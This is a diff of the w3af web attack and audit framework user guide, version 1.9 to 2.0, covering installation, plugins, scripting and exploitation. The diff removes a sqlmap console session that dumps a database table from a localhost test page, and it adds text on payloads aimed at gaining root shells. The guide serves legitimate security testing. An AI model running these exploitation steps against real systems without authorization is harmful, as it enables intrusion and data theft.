@@ -6,7 +6,7 @@
 	<META NAME="GENERATOR" CONTENT="OpenOffice.org 3.2  (Unix)">
 	<META NAME="CREATED" CONTENT="20070514;16454200">
 	<META NAME="CHANGEDBY" CONTENT="dz0 ">
-	<META NAME="CHANGED" CONTENT="20110423;14193900">
+	<META NAME="CHANGED" CONTENT="20110523;22311400">
 	<META NAME="Info 1" CONTENT="">
 	<META NAME="Info 2" CONTENT="">
 	<META NAME="Info 3" CONTENT="">
@@ -46,7 +46,7 @@ User Guide</B></U></FONT></FONT></P>
 <BR>
 </P>
 <P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; font-weight: normal; text-decoration: none">
-<FONT SIZE=2>Document version: <B>1.</B><B>9</B></FONT></P>
+<FONT SIZE=2>Document version: <B>2</B><B>.</B><B>0</B></FONT></P>
 <P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; font-weight: normal; text-decoration: none">
 <FONT SIZE=2>Original author: <B>Andres Riancho</B></FONT></P>
 <P ALIGN=CENTER STYLE="margin-bottom: 0in; font-style: normal; font-weight: normal; text-decoration: none">
@@ -93,8 +93,8 @@ User Guide</B></U></FONT></FONT></P>
 </P>
 <P ALIGN=CENTER STYLE="margin-bottom: 0in"><BR>
 </P>
-<P ALIGN=CENTER STYLE="margin-bottom: 0in"><FONT SIZE=2><I><U><B>January
-28, 2011</B></U></I></FONT></P>
+<P ALIGN=CENTER STYLE="margin-bottom: 0in"><FONT SIZE=2><I><U><B>May
+25, 2011</B></U></I></FONT></P>
 <P ALIGN=CENTER STYLE="margin-bottom: 0in; page-break-before: always">
 <BR>
 </P>
@@ -142,14 +142,14 @@ User Guide</B></U></FONT></FONT></P>
 <H2 CLASS="western" STYLE="page-break-before: always"><A NAME="SECTION00200000000000000000"></A>
 Introduction 
 </H2>
-<P ALIGN=JUSTIFY>This document is a user guide for the Web
+<P ALIGN=JUSTIFY>This document is the users guide for the Web
 Application Attack and Audit Framework ( w3af ), its goal is to
 provide a basic overview of what the framework is, how it works and
 what you can do with it. 
 </P>
 <P ALIGN=JUSTIFY>w3af is a complete environment for auditing and
 attacking web applications. This environment provides a solid
-platform for auditing and penetration-testing. 
+platform for web vulnerability assessments and penetration tests. 
 </P>
 <P ALIGN=JUSTIFY><BR><BR>
 </P>
@@ -157,7 +157,7 @@ platform for auditing and penetration-testing.
 <P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
 framework can be downloaded from the project main page: </FONT>
 </P>
-<P STYLE="margin-left: 0.49in; margin-top: 0.17in"><FONT FACE="Bitstream Vera Sans, sans-serif"><A HREF="http://w3af.sf.net/#download">http://w3af.sf.net/#download</A></FONT></P>
+<P STYLE="margin-left: 0.49in; margin-top: 0.17in"><FONT FACE="Bitstream Vera Sans, sans-serif"><A HREF="http://www.w3af.com/#download">http://www.w3af.com/#download</A></FONT></P>
 <P ALIGN=JUSTIFY STYLE="margin-top: 0.17in"><FONT FACE="Bitstream Vera Sans, sans-serif">There
 are two ways to install w3af: from a release package (w3af setup for
 windows and tgz package for Unix based systems) or from SVN. First
@@ -167,13 +167,16 @@ framework. </FONT>
 </P>
 <P ALIGN=JUSTIFY STYLE="margin-top: 0.17in"><FONT SIZE=4><I><B>Installation</B></I></FONT></P>
 <P ALIGN=JUSTIFY STYLE="background: #ffffff; font-style: normal; text-decoration: none">
-<FONT SIZE=3>The framework should work on all platforms supported <SPAN STYLE="background: #ffffff">by
-Python</SPAN><SPAN STYLE="background: #ffffff">.</SPAN> w3af has been
-teste<SPAN STYLE="background: #ffffff">d on Linux, Window</SPAN>s XP,
-Windows Vista and OpenBSD. This user guide will guide you through the
-installation on a Linux platform. installing w3af in a Windows box is
-straight forward if you use the available installer which can be
-downloaded from the official w3af site.</FONT></P>
+<FONT SIZE=3>The framework should work on all Python supported
+platforms<SPAN STYLE="background: #ffffff">.</SPAN> w3af has been
+successfully installed and used <SPAN STYLE="background: #ffffff">on
+Linux, Window</SPAN>s XP, Windows Vista, FreeBSD and OpenBSD. </FONT>
+</P>
+<P ALIGN=JUSTIFY STYLE="background: #ffffff; font-style: normal; text-decoration: none">
+<FONT SIZE=3>This user guide will guide you through the installation
+on a Linux platform. Installing w3af in a Windows operating system is
+straight forward if you use the installer available at the official
+w3af site.</FONT></P>
 <H3 CLASS="western" ALIGN=JUSTIFY STYLE="font-style: normal; page-break-after: avoid">
 Installation Requirements</H3>
 <P>The required packages to run w3af can be divided in two groups:</P>
@@ -181,7 +184,7 @@ Installation Requirements</H3>
 	<LI VALUE=1><P>Core requirements:</P>
 </UL>
 <UL>
-	<LI VALUE=1><P>Python <B>2.5</B></P>
+	<LI VALUE=1><P>Python <B>2.</B><B>6</B></P>
 	<LI><P>fpconst-0.7.2</P>
 	<LI><P>nltk</P>
 	<LI><P>SOAPpy</P>
@@ -191,13 +194,13 @@ Installation Requirements</H3>
 	<LI><P>json.py</P>
 	<LI><P>scapy</P>
 	<LI><P>pysvn</P>
+	<LI><P>python sqlite3</P>
 	<P></P>
 </UL>
 <UL>
 	<LI VALUE=1><P>Graphical user interface requirements:</P>
 </UL>
 <UL>
-	<LI><P>python sqlite3</P>
 	<LI><P>graphviz</P>
 </UL>
 <UL>
@@ -209,7 +212,7 @@ Installation Requirements</H3>
 </UL>
 <P ALIGN=JUSTIFY>As you may have guessed, the core requirements are
 needed to run w3af with any user interface (console or graphical),
-and the graphical user interface requirements are needed only if you
+and the graphical user interface requirements are only needed if you
 plan to use the GTK+ user interface.</P>
 <P ALIGN=JUSTIFY>Some of the requirements are bundled with the
 distribution file, in order to make the installation process easier
@@ -240,12 +243,12 @@ pyPdf</FONT></P>
 <P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">python
 setup.py install</FONT></P>
 <H2 CLASS="western" STYLE="page-break-after: avoid"><FONT FACE="Bitstream Vera Sans, sans-serif">Auto-Update</FONT></H2>
-<P ALIGN=JUSTIFY>The framework also includes an auto-update feature.
-This feature allows you to run our latest SVN version without
-worrying about executing the “<FONT FACE="Nimbus Mono L, monospace">svn
+<P ALIGN=JUSTIFY>The framework includes an auto-update feature. This
+feature allows you to run our latest SVN version without worrying
+about executing the “<FONT FACE="Nimbus Mono L, monospace">svn
 update</FONT>” command or even having a SVN client. You can
-configure your local w3af instance to do it for you once a day,
-weekly or monthly.</P>
+configure your local w3af instance to update itself for you once a
+day, weekly or monthly.</P>
 <P ALIGN=JUSTIFY>The auto-update feature is enabled by default and
 its configuration can be changed using the “startup.conf” file
 which is saved (<FONT FACE="Nimbus Mono L, monospace">~/.w3af/startup.conf</FONT>)
@@ -267,9 +270,9 @@ W</B><SPAN STYLE="font-weight: normal">[eekly]</SPAN><B>, [M]</B><SPAN STYLE="fo
 </P>
 <P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">auto-update
 = true</FONT></P>
-<P>Depending on this configuration w3af will know when to perform the
-next  update verification. However you are able to force the update
-to take place, or not, by simply giving the startup script the
+<P>Depending on this configuration, w3af will know when to perform
+the next  update verification. It is also possible to force the
+update to take place, or not, by simply giving the startup script the
 desired option: <FONT FACE="Nimbus Mono L, monospace">--force-update</FONT><FONT FACE="Nimbus Mono L, monospace">
 or</FONT><FONT FACE="Nimbus Mono L, monospace"> </FONT><FONT FACE="Nimbus Mono L, monospace">–</FONT><FONT FACE="Nimbus Mono L, monospace">no-update</FONT>.</P>
 <P>This is the typical console output when the auto-update process is
@@ -313,10 +316,10 @@ summary of the new code commits log </FONT>
 </P>
 <P>	<B>w3af&gt;&gt;&gt;</B><FONT FACE="Nimbus Mono L, monospace"><B> </B></FONT>
 </P>
-<P>Sometimes it may happen that the last update has something that
-you may not be happy about. w3af gives the option to go back to the
-last local working version for those cases. You can do it by simply
-using the <FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: normal">“-r”
+<P>Sometimes it may happen that the last update introduced changes
+that you may not be happy about. w3af gives the option to go back to
+the last local working version for those cases. You can do it by
+simply using the <FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: normal">“-r”
 or “--revision”</SPAN></FONT> option along with the <FONT FACE="Nimbus Mono L, monospace"><FONT SIZE=3>PREV
 </FONT></FONT><FONT FACE="Bitstream Vera Sans, sans-serif"><FONT SIZE=3>argument</FONT></FONT><FONT FACE="Bitstream Vera Sans, sans-serif">:</FONT></P>
 <P><FONT SIZE=3>	<FONT FACE="Nimbus Mono L, monospace"><B>$</B></FONT><FONT FACE="Nimbus Mono L, monospace">
@@ -340,15 +343,18 @@ revision:</FONT></P>
 </P>
 <H2 CLASS="western" STYLE="page-break-after: avoid"><FONT FACE="Bitstream Vera Sans, sans-serif"><I>w3af
 phases</I></FONT></H2>
-<P ALIGN=JUSTIFY>Before running w3af a user must know how the
-application is divided and how plugins are going to be executed. The
-framework has three types of plugins: discovery , audit and attack.</P>
+<P ALIGN=JUSTIFY>Before running w3af, users need to know the basis
+about how the application works behind the scenes. This will enable
+users to be more efficient in the process of identifying and
+exploiting vulnerabilities.</P>
+<P ALIGN=JUSTIFY>The framework has three types of plugins: discovery
+, audit and attack.</P>
 <P ALIGN=JUSTIFY><I>Discovery plugins</I> have only one
 responsibility, finding new URLs, forms, and other “injection
-points”. A classic example of a discovery plugin is a web spider.
+points”. A classic example of a discovery plugin is the web spider.
 This plugin takes a URL as input and returns one or more injection
 points. When a user enables more than one plugin of this type, they
-work in a loop: If plugin A finds a new URL in the first run, the
+are run in a loop: If plugin A finds a new URL in the first run, the
 w3af core will send that URL to plugin B. If plugin B then finds a
 new URL, it will be sent to plugin A. This process will go on until
 all plugins are run and no more knowledge about the application can
@@ -366,10 +372,11 @@ the case of SQL injections exploits.</SPAN></P>
 <H2 CLASS="western"><I>Running w3af</I></H2>
 <P ALIGN=JUSTIFY STYLE="font-style: normal">w3af has two user
 interfaces, the console user interface (consoleUI) and the graphical
-user interface (gtkUi). This user guide will focus on the consoleUI,
-which ismore fully tested and complete than the gtkUi. To fire up the
-consoleUI you just have to execute w3af without parameters and you
-will get a prompt like this one:</P>
+user interface (gtkUi). This user guide will focus on the console
+user interface, where it's easier to explain the framework's
+features. To fire up the consoleUI you just have to execute
+“w3af_console” without parameters and you will get a prompt like
+this one:</P>
 <P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
 ./w3af_console</FONT></P>
 <P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B></FONT></P>
@@ -456,7 +463,7 @@ the target URL.</FONT></P>
 main menu commands are explained in the help that is displayed above.
 The internals of every menu will be seen later in this document. As
 you already noticed, the “help” command can take a parameter, and
-if available, a detailed help for that parameter will be shown, <FONT FACE="Bitstream Vera Sans, sans-serif"><SPAN STYLE="font-style: normal"><SPAN STYLE="background: transparent">e.g.
+if available, a detailed help for that command will be shown, <FONT FACE="Bitstream Vera Sans, sans-serif"><SPAN STYLE="font-style: normal"><SPAN STYLE="background: transparent">e.g.
 “help keys”.</SPAN></SPAN></FONT></FONT></P>
 <P ALIGN=JUSTIFY STYLE="font-style: normal"><FONT FACE="Bitstream Vera Sans, sans-serif">Other
 interesting things to notice about the consoleUI is  the ability for
@@ -643,8 +650,8 @@ set timeout 5</FONT></P>
 view</FONT></P>
 <P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
 <P STYLE="margin-left: 0.49in; font-style: normal; font-weight: normal">
-<FONT FACE="Nimbus Mono L, monospace">| timeout                  | 5 
-                | The         | </FONT>
+<FONT FACE="Nimbus Mono L, monospace">| timeout                  | <B>5</B>
+                 | The         | </FONT>
 </P>
 <P STYLE="margin-left: 0.49in; font-style: normal"><FONT FACE="Nimbus Mono L, monospace">...</FONT></P>
 <P STYLE="margin-left: 0.49in; font-style: normal"><BR><BR>
@@ -688,7 +695,7 @@ their tasks.</FONT></P>
 with GTK user interface</H3>
 <P STYLE="font-style: normal"><BR><BR>
 </P>
-<P STYLE="font-style: normal">The framework also has a graphical user
+<P STYLE="font-style: normal">The framework has also a graphical user
 interface that you can start by executing:</P>
 <P STYLE="font-style: normal"><BR><BR>
 </P>
@@ -730,11 +737,12 @@ and exploit.  The complete list of plugins types is:</P>
 <P><BR><BR>
 </P>
 <P ALIGN=JUSTIFY>Discovery plugins find new points of injection that
-are later used by audit plugins to find vulnerabilities. Grep plugins
-analyze all page content and find vulnerabilities on pages that are
-requested by other plugins; for example, a grep plugin will find a
-comment on the HTML body that has the word “password” inside it 
-and generate a vulnerability based on it.</P>
+are later used by audit plugins to find vulnerabilities.</P>
+<P ALIGN=JUSTIFY>Grep plugins analyze HTTP requests and responses
+that are initiated by other plugins and identify vulnerabilities on
+that traffic; for example, a grep plugin will find a comment on the
+HTML body that has the word “password” inside it  and generate a
+vulnerability based on it.</P>
 <P ALIGN=JUSTIFY>Exploit plugins [ab]use the vulnerabilities found in
 the audit phase and return something useful to the user ( remote
 shell, SQL table dump, a proxy, etc ).</P>
@@ -1299,7 +1307,7 @@ application, use it in a greedy way and you will be waiting for hours
 until the discovery phase ends. Just to make things clear, the greedy
 way is to enable all discovery plugins ( “discovery all” )
 without even knowing what you are doing or having manually browsed
-the web and understood its internals. 
+the target web application and understood its size and components. 
 </P>
 <P>Some examples will make things clear: 
 </P>
@@ -1310,7 +1318,7 @@ the web and understood its internals.
 	</P>
 	<P ALIGN=JUSTIFY><I>Recommendation :</I> “discovery
 	all,!spiderMan, !fingerGoogle, !fingerBing, !fingerPKS, !BingSpider,
-	!googleSpider, !phishtank, !googleSafeBrowsing”.</P>
+	!googleSpider, !phishtank” .</P>
 	<P ALIGN=JUSTIFY><I>Reason: </I><SPAN STYLE="font-style: normal">Spiderman
 	should only be used when webSpider can't find all links. The
 	fingerGoogle, finger</SPAN><SPAN STYLE="font-style: normal">Bing</SPAN><SPAN STYLE="font-style: normal">
@@ -1320,33 +1328,40 @@ the web and understood its internals.
 	</SPAN><SPAN STYLE="font-style: normal">Bing</SPAN><SPAN STYLE="font-style: normal">Spider
 	and googleSpider find URLs using search engines, like the ones
 	before, they are useless because search engines don't index private
-	pages. phishtank and googleSafeBrowsing should be enabled because
-	they search for phishing sites, and like the ones before them,
-	private sites aren't indexed in this systems.</SPAN></P>
+	pages. phishtank </SPAN><SPAN STYLE="font-style: normal">should be
+	enabled because </SPAN><SPAN STYLE="font-style: normal">it </SPAN><SPAN STYLE="font-style: normal">search</SPAN><SPAN STYLE="font-style: normal">es</SPAN><SPAN STYLE="font-style: normal">
+	for phishing sites, and like the ones before them, private sites
+	aren't indexed in this systems.</SPAN></P>
 	<P></P>
 	<LI><P>“You are testing a web application over the internet, the
 	web application is huge and doesn't use any macromedia flash or
 	javascript code”. 
 	</P>
-	<P><I>Recommendation</I> : “discovery all,!spiderMan, !wordnet ,
-	!googleSets”.</P>
+	<P><I>Recommendation</I> : “discovery all,!spiderMan, !wordnet”.</P>
 	<P ALIGN=JUSTIFY><I>Reason: </I><SPAN STYLE="font-style: normal">Spiderman
 	should only be used when webSpider can't find all links. The wordnet
-	and googleSets plugins are two plugins that take a long time to run
-	over the internet so it's a good idea to disable them.</SPAN></P>
-	<P></P>
+	</SPAN><SPAN STYLE="font-style: normal">plugin</SPAN><SPAN STYLE="font-style: normal">
+	</SPAN><SPAN STYLE="font-style: normal">take</SPAN><SPAN STYLE="font-style: normal">s</SPAN><SPAN STYLE="font-style: normal">
+	a long time to run over the internet so it's a good idea to disable
+	them.</SPAN></P>
+</UL>
+<P><BR><BR>
+</P>
+<P><BR><BR>
+</P>
+<UL>
 	<LI><P>“You are testing a web application over the internet, the
 	web application is huge and has macromedia flash or javascript code.
 	You also know that the application doesn't implement any web
 	services”. 
 	</P>
-	<P><I>Recommendation</I> : “discovery all, !wordnet , !googleSets,
-	!wsdlFinder”.</P>
+	<P><I>Recommendation</I> : “discovery all, !wordnet, !wsdlFinder”.</P>
 	<P ALIGN=JUSTIFY><I>Reason: </I><SPAN STYLE="font-style: normal">The
-	wordnet and googleSets plugins are two plugins that take a </SPAN><SPAN STYLE="font-style: normal">long
-	time to run over the internet so it's a good idea to disable them.
-	Regarding wsdlFinder, if we already know that no web services exist,
-	why look for them?</SPAN></P>
+	wordnet </SPAN><SPAN STYLE="font-style: normal">plugin</SPAN><SPAN STYLE="font-style: normal">
+	</SPAN><SPAN STYLE="font-style: normal">take</SPAN><SPAN STYLE="font-style: normal">s</SPAN><SPAN STYLE="font-style: normal">
+	a long time to run over the internet so it's a good idea to disable
+	them. Regarding wsdlFinder, if we already know that no web services
+	exist, why look for them?</SPAN></P>
 	<P></P>
 	<LI><P>“You are testing a web application over the internet, the
 	web application is huge, you really need to know all the links and
@@ -1368,7 +1383,7 @@ with the audit plugins.</SPAN></P>
 <H3 CLASS="western">When everything else fails...</H3>
 <P ALIGN=JUSTIFY STYLE="font-style: normal">So, you enabled only the
 recommended plugins in the discovery phase, you started the framework
-one hour ago, the discovery is still running and doesn't find
+two hours ago, the discovery is still running and doesn't find
 anything. When you find yourself in this situation you have two
 options, waiting for w3af to finish or hitting CTRL+C to finish the
 discovery and start with the audit phase.</P>
@@ -1379,15 +1394,15 @@ see what w3af is really doing.</P>
 <H2 CLASS="western">w3af scripts</H2>
 <P><BR><BR>
 </P>
-<P ALIGN=JUSTIFY>While developing w3af, I realized that I needed a
-fast way to execute the same steps over and over, so the script
+<P ALIGN=JUSTIFY>While developing w3af, we realized the need of fast
+and easy way to execute the same steps over and over, so the script
 functionality was born. w3af can run a script file using the “-s”
-argument. Script files are text files with one command on each line.
-An example script file would look like this:</P>
+argument. Script files are text files with one consoleUi command on
+each line. An example script file would look like this:</P>
 <P><BR><BR>
 </P>
 <P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
-head scripts/script-osCommanding.w3af</FONT></P>
+head scripts/script-os_commanding.w3af</FONT></P>
 <P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">#
 This is the osCommanding demo:</FONT></P>
 <P STYLE="margin-left: 0.49in"><BR><BR>
@@ -1407,12 +1422,13 @@ verbose True</FONT></P>
 </P>
 <P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">To run
 this script you would execute <FONT FACE="Nimbus Mono L, monospace">“./w3af_console
--s scripts/script-osCommanding.w3af” </FONT>,  the output would
-look just like if you typed every command by hand in the console:</FONT></P>
+-s scripts/script-os</FONT><FONT FACE="Nimbus Mono L, monospace">_</FONT><FONT FACE="Nimbus Mono L, monospace">c</FONT><FONT FACE="Nimbus Mono L, monospace">ommanding.w3af”
+</FONT>,  the output will look just like if you manually typed every
+command in the console:</FONT></P>
 <P><BR><BR>
 </P>
 <P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
-./w3af_console -s scripts/script-osCommanding.w3af</FONT></P>
+./w3af_console -s scripts/script-os_commanding.w3af</FONT></P>
 <P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: normal">plugins
 </SPAN></FONT>
 </P>
@@ -1616,11 +1632,11 @@ a remote shell today? </FONT>
 <H2 CLASS="western">The Output</H2>
 <P><BR><BR>
 </P>
-<P ALIGN=JUSTIFY>All the output of w3af is managed by the output
+<P ALIGN=JUSTIFY>All the w3af's output is managed by the output
 plugins. Each output plugin will write in a different format ( txt,
 html, etc ), for example the textFile plugin writes all output to the
-output-w3af.txt file by default. The configuration of this plugins is
-done just like other plugins, as seen before:</P>
+output-w3af.txt file by default. The configuration of these plugins
+is done just like any other plugin, as seen before:</P>
 <P><BR><BR>
 </P>
 <P STYLE="margin-left: 0.49in; font-weight: normal"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
@@ -1775,24 +1791,24 @@ enabled plugins, so if you have enabled textFile and htmlFile output
 plugins, both will log a vulnerability found by an audit plugin.</FONT></P>
 <P STYLE="font-weight: normal"><BR><BR>
 </P>
-<H2 CLASS="western">Complex sites</H2>
+<H2 CLASS="western">Complex web applications</H2>
 <P><BR><BR>
 </P>
-<P ALIGN=JUSTIFY>Some sites use embedded objects, like Macromedia
-Flash and Java applets, that the browser renders to the user. Because
-of the inability of the framework to get any information out of those
-objects, a script called spiderMan was created. This script will run
-a HTTP proxy so the user can navigate the target site through it;
+<P ALIGN=JUSTIFY>Some web applications use browser-side technologies
+like JavaScript, Macromedia Flash and Java applets, technologies that
+the browsers understand; and w3af is still unable to. Because of
+this, a script called spiderMan was created. This script will run an
+HTTP proxy for the user to navigate the target site through it;
 during this process the plugin will extract information from the
 requests and responses.</P>
 <P ALIGN=JUSTIFY>A simple example will clarify things, let's suppose
 that w3af is auditing a site and can't find any links on the main
 page. After a closer interpretation of the results by the user, it is
 clear that the main page has a Java applet menu where all the other
-sections are linked. The user runs w3af once again and now activates
-the spiderMan plugin, navigates the site manually using the browser
-and the spiderman proxy. When the user has finished his browsing,
-w3af will continue with all the hard auditing work.</P>
+sections are linked from. The user runs w3af once again and now
+activates the spiderMan plugin, navigates the site manually using the
+browser and the spiderman proxy. When the user has finished his
+browsing, w3af will continue with all the hard auditing work.</P>
 <P ALIGN=JUSTIFY>The spiderMan plugin can be used when Javascript,
 Flash, Java applets or any other browser side technology is present.</P>
 <P>This is a sample spiderMan plugin run:</P>
@@ -1888,14 +1904,11 @@ sqli plugin execution.</FONT></P>
 <H2 CLASS="western">Exploiting</H2>
 <P><BR><BR>
 </P>
-<P ALIGN=JUSTIFY>Two ways of exploiting a vulnerability exist, the
-first one uses the vulnerabilities found by the audit phase and the
-second one, which is called fastextploit, requires the user to enter
-the vulnerability parameters.</P>
-<P ALIGN=JUSTIFY><BR><BR>
-</P>
-<P ALIGN=JUSTIFY>Let's see an example of the first way of exploiting
-a vulnerability with w3af:</P>
+<P ALIGN=JUSTIFY>w3af allows users to exploit vulnerabilities
+identified during the audit phase. As vulnerabilities are found, they
+are stored in specific locations of the knowledge base, where exploit
+plugins can read from and use that information to exploit the
+vulnerability:</P>
 <P ALIGN=JUSTIFY STYLE="font-weight: normal"><BR><BR>
 </P>
 <P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B><SPAN STYLE="font-weight: normal">plugins
@@ -1998,470 +2011,305 @@ typed in this menu will be runned on the remote web server. </FONT>
 </SPAN></FONT>
 </P>
 <P STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B></FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
-</P>
-<P ALIGN=JUSTIFY>The second way is to use fastexploit. This method
-should be used when the user has found a vulnerability manually and
-wants to exploit it using the framework. Here is an example of a
-fastexploit run:</P>
 <P ALIGN=JUSTIFY><BR><BR>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
-exploit</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B>
-exploit config sqlmap</FONT></P>
-<P ALIGN=LEFT STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugin/sqlmap&gt;&gt;&gt;
-</B>set url http://localhost/w3af/blindSqli/blindSqli-integer.php</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugin/sqlmap&gt;&gt;&gt;</B>
-set injvar id</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugin/sqlmap&gt;&gt;&gt;</B>
-set data id=1</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugin/sqlmap&gt;&gt;&gt;</B>
-back</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B>
-fastexploit sqlmap</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">sqlmap
-coded by inquis &lt;bernardo.damele@gmail.com&gt; and belch
-&lt;daniele.bellucci@gmail.com&gt;</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">SQL
-injection could be verified, trying to create the DB driver.</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Execute
-&quot;exitPlugin&quot; to get out of the remote shell. Commands typed
-in this menu will be runned on the remote web server.</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/sqlmap&gt;&gt;&gt;</B>
-dump agenda w3af_test</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Database:
-w3af_test</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Table:
-agenda</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[2
-entries]</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">+---------------+----+--------+----------+-----------------+</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
-direccion     | id | nombre | telefono | email           |</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">+---------------+----+--------+----------+-----------------+</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
-direccion 123 | 1  | apr    | 52365786 | acho@c.com      |</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">|
-direccion 333 | 2  | vico   | 47998123 | vTro@c.com      |</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">+---------------+----+--------+----------+-----------------+</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/sqlmap&gt;&gt;&gt;</B></FONT></P>
-<H3 CLASS="western">Advanced exploiting techniques</H3>
+<H3 CLASS="western">Web Application Payloads - Introduction</H3>
 <P><BR><BR>
 </P>
-<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-framework implements two highly advanced exploiting techniques that
-allow the user to keep escalating privileges into the remote network.
-Both of this techniques are used once the framework is able to
-execute remote operating system commands, this is the case of (for
-example) osCommanding, remoteFileIncludeShell and davShell attack
-plugins. These exploiting techniques are:</FONT></P>
+<P>From the hundreds of different Web Application Vulnerabilities
+that can be found on any web application, <B>only a small percentage
+gives the intruder a direct way for executing operating system
+commands. </B> And if we keep digging into that group we’ll
+identify only one or two that under normal circumstances might give
+the intruder elevated privileges.</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Keeping always in mind that the
+objective of the penetration tester is to gain a root shell in the
+remote server, Web applications seem to offer more resistance than
+classic memory corruption exploits; which is true if you have a 0day
+exploit developed within the Metasploit framework that matches the
+remote server installation, but if not… <B>the Web might be the
+only way in.</B></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Until
+now, the exploitation of these vulnerabilities, and the steps needed
+to achieve access with a user of elevated privileges had to be
+performed manually, which could in many situations take hours
+(depending on the web application penetration tester’s skills) and
+may or may not achieve its objective.</FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Web Application Payloads are the
+evolution of old school system call payloads which are used in memory
+corruption exploits since the 80's. The basic problem solved by any
+payload is pretty simple: &quot;I have <I>access</I>, what now?&quot;.
+In memory corruption exploits it's pretty easy to perform arbitrary
+tasks because after successful exploitation the attacker is able to
+control the remote CPU and memory, which allow for execution of
+arbitrary operating system calls. With this power it’s possible to
+create a new user, run arbitrary commands or upload  files.</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">In the Web Application field <I>the
+situation is completely</I> <I>different</I>, the intruder is
+restricted to the &quot;system calls&quot; that the vulnerable Web
+Application script exposes. For example:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
 <UL>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Virtual
-	daemon, allows you <FONT FACE="Bitstream Vera Sans, sans-serif">to
-	use metasploit payloads to exploit the server that supports a
-	vulnerable web application.</FONT></FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3afAgent,
-	which creates a tunnel between the compromised server and w3af, the
-	allow the user to route TCP connections through the remote server.</FONT></P>
-	<P ALIGN=JUSTIFY></P>
+	<LI><P STYLE="margin-bottom: 0in">Arbitrary File Read
+	Vulnerabilities <I>expose</I> <B>read()</B></P>
+	<LI><P STYLE="margin-bottom: 0in">OS Commanding Vulnerabilities
